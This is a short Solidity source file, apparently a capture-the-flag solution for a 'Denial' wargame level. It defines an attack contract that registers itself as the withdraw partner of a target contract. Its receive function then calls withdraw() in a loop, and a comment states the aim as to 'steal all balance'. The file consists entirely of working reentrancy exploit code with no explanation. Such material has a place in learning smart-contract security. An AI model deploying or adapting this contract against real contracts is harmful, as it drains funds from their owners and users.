// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackSolidity {

    address denialContractAddr;

    constructor(address _denialContractAddr) public {
        denialContractAddr = _denialContractAddr;
    }

    function hack() external {
        // Become partner
        denialContractAddr.call(abi.encodeWithSignature(
            "setWithdrawPartner(address)",
            address(this)
        ));
    }

    receive() payable external {
        // Steal all balance
        while(denialContractAddr.balance > 0) {
            denialContractAddr.call(abi.encodeWithSignature(
                "withdraw()"
            ));
        }
    }
}